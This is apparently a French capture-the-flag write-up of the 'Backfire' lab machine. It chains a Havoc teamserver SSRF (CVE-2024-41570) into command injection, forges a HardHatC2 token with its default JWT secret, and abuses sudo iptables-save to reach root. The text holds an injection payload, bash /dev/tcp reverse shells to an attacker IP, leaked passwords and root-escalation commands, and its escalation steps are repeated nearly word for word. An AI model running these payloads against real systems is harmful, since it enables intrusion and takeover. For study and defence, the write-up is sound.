![Cover](cover.png)

### Énumération et Scanning

Je commence par une phase classique de reconnaissance avec **nmap** pour identifier la surface d'attaque. Le scan complet des ports TCP révèle trois services exposés et deux ports filtrés.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.49

# Scan de version et scripts par défaut sur les ports identifiés
nmap -p 22,443,8000 -sCV 10.10.11.49
```

**Résultats du scan :**
*   **Port 22 (SSH)** : OpenSSH 9.2p1 (Debian).
*   **Port 443 (HTTPS)** : Nginx 1.22.1. Le certificat SSL est auto-signé pour `127.0.0.1`.
*   **Port 8000 (HTTP)** : Nginx 1.22.1. Affiche un **Directory Listing**.
*   **Ports 5000, 7096** : État `filtered`.

### Analyse des services Web

Sur le port 443, une requête `GET` basique retourne une erreur 404, mais l'analyse des headers HTTP révèle un champ crucial : `X-Havoc: true`. Cela indique la présence d'un **Teamserver Havoc**, un framework de **C2 (Command & Control)** open-source écrit en Go.

Le port 8000 expose deux fichiers particulièrement sensibles :
1.  `disable_tls.patch` : Un patch pour le client Havoc suggérant que le port de management **40056** est utilisé localement sans TLS.
2.  `havoc.yaotl` : Le fichier de configuration du **Teamserver**.

**Extraction du fichier `havoc.yaotl` :**
Le fichier contient des informations critiques, notamment des identifiants d'opérateurs et la configuration des **Listeners**.

```yaml
Operators {
    user "ilya" { Password = "CobaltStr1keSuckz!" }
    user "sergej" { Password = "1w4nt2sw1tch2h4rdh4tc2" }
}
Listeners {
    Http {
        Name = "Demon Listener"
        Hosts = [ "backfire.htb" ]
        HostBind = "127.0.0.1"
        PortBind = 8443
    }
}
```

### Analyse de la vulnérabilité : CVE-2024-41570 (SSRF)

Le **Teamserver Havoc** (version 0.7) est vulnérable à une **Unauthenticated SSRF** au niveau de la gestion des callbacks des agents (**Demons**). 

> Schéma Mental :
> [Attaquant] -> [Requête POST malveillante vers Listener (8443)] -> [Teamserver Havoc] -> [Requête arbitraire vers Localhost (40056)]

La vulnérabilité réside dans la fonction `IsKnownRequestID`. Normalement, le serveur rejette toute commande d'un agent s'il n'a pas lui-même initié la requête. Cependant, les commandes `COMMAND_SOCKET` et `COMMAND_PIVOT` sont explicitement autorisées sans vérification de `RequestID` pour permettre le tunneling. Un attaquant peut donc forger un enregistrement d'agent, puis utiliser ces commandes pour forcer le **Teamserver** à effectuer des requêtes réseau sortantes.

### Vecteur d'attaque : Chaining SSRF vers RCE

L'objectif est d'atteindre le port de management interne (**40056**) via la **SSRF**. Ce port expose une interface **WebSocket** pour les opérateurs. Bien que l'accès soit authentifié (via les credentials d'Ilya trouvés précédemment), une seconde vulnérabilité de type **Command Injection** existe dans le module de compilation des implants (**Builder**).

La faille se situe dans `builder.go`. Lors de la génération d'un agent, le champ `Service Name` n'est pas correctement assaini avant d'être concaténé dans une commande `sh -c`.

**Payload d'injection :**
`\" -mbla; <COMMAND> 1>&2 && false #`

### Exploitation et Premier Shell

Je dois concevoir un exploit capable de :
1.  S'enregistrer comme un faux agent via le listener public.
2.  Utiliser la **SSRF** pour ouvrir une connexion **WebSocket** vers `127.0.0.1:40056`.
3.  Envoyer les frames **WebSocket** d'authentification.
4.  Envoyer le payload de **Command Injection** via une requête de build d'implant.

```python
# Structure simplifiée du payload WebSocket pour l'injection
injection = "\\\" -mbla; echo <B64_REVERSE_SHELL> | base64 -d | bash 1>&2 && false #"

payload = {
    "Body": {
        "Info": {
            "AgentType": "Demon",
            "Config": {
                "Service Name": injection,
                # ... autres paramètres requis
            },
            "Format": "Windows Service Exe"
        },
        "SubEvent": 2 # Build Request
    },
    "Head": { "Event": 5, "User": "ilya" }
}
```

Après exécution de l'exploit chaîné, je reçois une connexion sur mon listener :

```bash
nc -lnvp 443
# Connection received on 10.10.11.49
python3 -c 'import pty; pty.spawn("/bin/bash")'
ilya@backfire:~$ id
uid=1000(ilya) gid=1000(ilya) groups=1000(ilya)
```

Le premier flag est accessible dans `/home/ilya/user.txt`. Pour stabiliser l'accès, j'ajoute ma clé publique dans `.ssh/authorized_keys`.

---

### Énumération Interne & Reconnaissance Post-Exploitation

Une fois l'accès initial obtenu en tant qu'utilisateur **ilya**, j'entame une phase d'énumération locale pour identifier des vecteurs de mouvement latéral. Le répertoire personnel d'**ilya** contient un fichier `hardhat.txt` crucial. Son contenu indique que l'utilisateur **sergej** a installé **HardHatC2** (un framework C2 en C#) en conservant les configurations par défaut.

L'inspection des processus et des connexions réseau confirme cette piste :
```bash
# Identification des processus de sergej
ps auxww | grep sergej

# Analyse des ports en écoute locale
netstat -tnl
```
Je remarque que les ports **5000** et **7096** sont actifs en local. Ces ports correspondent respectivement à l'API du **TeamServer** et à l'interface web du client **HardHatC2**. Comme ils étaient filtrés lors du scan **Nmap** externe, je dois mettre en place un **SSH Tunneling** pour y accéder depuis ma machine d'attaque.

```bash
# Mise en place du port forwarding via SSH
ssh -i id_rsa ilya@10.10.11.49 -L 5000:127.0.0.1:5000 -L 7096:127.0.0.1:7096
```

### Mouvement Latéral : Exploitation de HardHatC2

**HardHatC2** utilise des **JSON Web Tokens (JWT)** pour l'authentification. En consultant le code source public du framework, je découvre que la **JWT Key** par défaut est `jtee43gt-6543-2iur-9422-83r5w27hgzaq`. Si **sergej** n'a pas modifié cette clé, je peux forger un token administratif.

> **Schéma Mental : JWT Forgery & C2 Hijacking**
> 1. **Local Lab** : Lancer une instance Docker locale de **HardHatC2** avec la clé par défaut.
> 2. **Token Generation** : S'authentifier sur l'instance locale pour générer un cookie de session valide pour l'utilisateur `HardHat_Admin`.
> 3. **Session Replay** : Injecter ce token dans le navigateur pointant vers le port **7096** tunnelisé de la cible.
> 4. **RCE via C2** : Utiliser les fonctionnalités natives du C2 (Terminal) pour exécuter des commandes sous l'identité du propriétaire du processus (**sergej**).

Après avoir injecté le token dans mon navigateur, j'accède à l'interface d'administration de **HardHatC2** sur la machine cible. Depuis le **Terminal** intégré du dashboard, j'exécute un **Reverse Shell** pour stabiliser mon accès en tant que **sergej**.

```bash
# Payload de reverse shell exécuté via le terminal HardHatC2
bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"
```

### Escalade de Privilèges : Abus de sudo et Arbitrary File Write

En tant que **sergej**, j'analyse mes privilèges **sudo**. La commande `sudo -l` révèle une configuration permissive pour les binaires de gestion du pare-feu :

```bash
sergej@backfire:~$ sudo -l
(root) NOPASSWD: /usr/sbin/iptables
(root) NOPASSWD: /usr/sbin/iptables-save
```

L'outil **iptables-save** possède une option `-f` (ou `--file`) qui permet d'écrire l'état actuel des règles de filtrage dans un fichier arbitraire avec les privilèges **root**.

> **Schéma Mental : Arbitrary Write via iptables-save**
> 1. **Poisoning** : Ajouter une règle **iptables** factice contenant une chaîne de caractères spécifique (ex: une clé SSH publique) dans le champ `comment`.
> 2. **Redirection** : Utiliser `iptables-save -f` pour dumper les règles dans un fichier sensible (ex: `/root/.ssh/authorized_keys`).
> 3. **Persistence** : Le service SSH ignorera les lignes malformées du dump d'iptables mais validera la ligne contenant la clé publique propre, permettant un accès **root** direct.

#### Procédure d'exploitation :

1. **Injection de la clé SSH dans la configuration iptables** :
J'utilise le module `comment` pour insérer ma clé publique. J'ajoute des retours à la ligne (`\n`) pour m'assurer que la clé apparaisse sur sa propre ligne dans le fichier de destination.

```bash
sudo iptables -A INPUT -i lo -m comment --comment $'\nssh-ed25519 AAAAC3... nobody@nothing\n'
```

2. **Déclenchement de l'écriture arbitraire** :
Je redirige le dump vers le fichier `authorized_keys` du compte **root**.

```bash
sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
```

3. **Accès final** :
Il ne reste plus qu'à se connecter via SSH pour obtenir un shell interactif avec les privilèges maximaux.

```bash
ssh -i id_ed25519 root@10.10.11.49
```

---

### Élévation de Privilèges : De ilya à sergej

Après avoir stabilisé mon accès en tant que **ilya**, l'énumération du système révèle la présence d'un second utilisateur, **sergej**, ainsi qu'une instance de **HardHatC2** en cours d'exécution. Un fichier `hardhat.txt` dans le répertoire personnel de **ilya** indique que **sergej** a installé ce framework C2 en conservant les configurations par défaut.

L'analyse des ports locaux montre que le **TeamServer** de **HardHatC2** écoute sur les ports **5000** et **7096**, lesquels étaient filtrés lors du scan externe.

#### Exploitation de HardHatC2 (JWT Secret)

Le framework **HardHatC2** utilise par défaut un **JWT Secret** statique défini dans son fichier de configuration `appsettings.json`. Si ce secret n'est pas modifié, n'importe qui peut forger un jeton d'authentification pour devenir administrateur de l'instance C2.

> **Schéma Mental : Détournement de C2 par Forgery**
> 1. **Identification** : Repérer un service C2 (HardHatC2) tournant avec les réglages d'usine.
> 2. **Extraction** : Récupérer le **JWT Secret** par défaut (`jtee43gt-6543-2iur-9422-83r5w27hgzaq`).
> 3. **Proxying** : Créer un **SSH Tunnel** pour accéder à l'interface Web locale du C2.
> 4. **Forgery** : Utiliser une instance locale de HardHatC2 ou un outil de manipulation JWT pour générer un cookie valide.
> 5. **RCE** : Utiliser les fonctionnalités natives du C2 (Terminal/Interactive Shell) pour exécuter des commandes sur l'hôte.

Je mets en place un **Local Port Forwarding** via SSH pour accéder à l'interface :

```bash
# Tunneling des ports d'administration de HardHatC2
ssh -i id_rsa ilya@10.10.11.49 -L 5000:127.0.0.1:5000 -L 7096:127.0.0.1:7096
```

En utilisant une instance locale de **HardHatC2** configurée avec le même secret, je récupère le jeton de session dans le **Local Storage** du navigateur et l'injecte dans ma session pointant vers la machine cible. Une fois authentifié sur `https://127.0.0.1:7096`, je crée un nouvel utilisateur avec le rôle **Team Lead**.

Depuis le terminal intégré du C2, j'exécute un **Reverse Shell** pour obtenir un accès direct en tant que **sergej** :

```bash
# Payload exécuté via le terminal HardHatC2
bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"
```

---

### Domination Totale : De sergej à root

L'inspection des privilèges **Sudo** de **sergej** révèle un vecteur critique lié à la gestion du pare-feu.

```bash
sergej@backfire:~$ sudo -l
User sergej may run the following commands on backfire:
    (root) NOPASSWD: /usr/sbin/iptables
    (root) NOPASSWD: /usr/sbin/iptables-save
```

#### Vecteur final : Arbitrary File Write via iptables-save

L'utilitaire **iptables-save** possède une option `-f` (ou `--file`) qui permet d'écrire l'état actuel des règles de filtrage dans un fichier spécifié. Puisque la commande est exécutable via **Sudo**, cela m'octroie une primitive d'**Arbitrary File Write** en tant que **root**.

Pour transformer cette écriture de fichier en exécution de code, je vais injecter ma clé publique SSH dans la configuration de **iptables** via le module **comment**, puis sauvegarder le résultat dans le fichier `authorized_keys` de **root**.

> **Schéma Mental : Abus de iptables pour l'écriture de fichiers**
> 1. **Injection** : Insérer une chaîne de caractères arbitraire (Clé SSH) dans la mémoire du noyau via une règle `iptables` factice utilisant un commentaire.
> 2. **Persistance** : Utiliser `iptables-save -f` pour dumper cette mémoire dans un fichier sensible (`/root/.ssh/authorized_keys`).
> 3. **Tolérance** : Le service SSH ignore les lignes malformées (les règles iptables) et ne traite que la ligne contenant la clé valide.

```bash
# 1. Injection de la clé SSH dans un commentaire iptables (avec newlines pour l'isolation)
sudo iptables -A INPUT -i lo -m comment --comment $'\nssh-ed25519 AAAAC3...[SNIP]... root@attackbox\n'

# 2. Écriture forcée dans le répertoire personnel de root
sudo iptables-save -f /root/.ssh/authorized_keys

# 3. Connexion SSH directe en tant que root
ssh -i id_rsa root@10.10.11.49
```

Je compromets ainsi totalement la machine et récupère le flag final dans `/root/root.txt`.

---

### Analyse Post-Exploitation "Beyond Root"

La compromission de **Backfire** met en lumière les risques critiques liés à l'infrastructure de **Red Team** elle-même.

1.  **C2 Security** : L'utilisation de frameworks comme **Havoc** ou **HardHatC2** sans durcissement préalable transforme l'attaquant en cible. La vulnérabilité **SSRF** (CVE-2024-41570) dans Havoc montre que même les outils de sécurité peuvent souffrir de failles de gestion de mémoire ou de logique de callback.
2.  **Default Credentials & Secrets** : Le maintien du **JWT Secret** par défaut dans **HardHatC2** est une erreur fatale. Dans un environnement de production ou d'engagement réel, ces secrets doivent être générés de manière cryptographiquement sécurisée lors du déploiement.
3.  **Sudo Over-Privileging** : Autoriser `iptables-save` avec l'option `-f` est équivalent à donner un accès **root** complet. Une restriction via un **Sudoers sudoedit** ou l'interdiction d'arguments spécifiques aurait pu mitiger ce risque.
4.  **Infrastructure Isolation** : Les ports de management (40056, 5000, 7096) ne devraient jamais être accessibles, même indirectement via une **SSRF**. L'utilisation de sockets Unix ou d'une authentification mutuelle (mTLS) pour les communications inter-C2 est recommandée.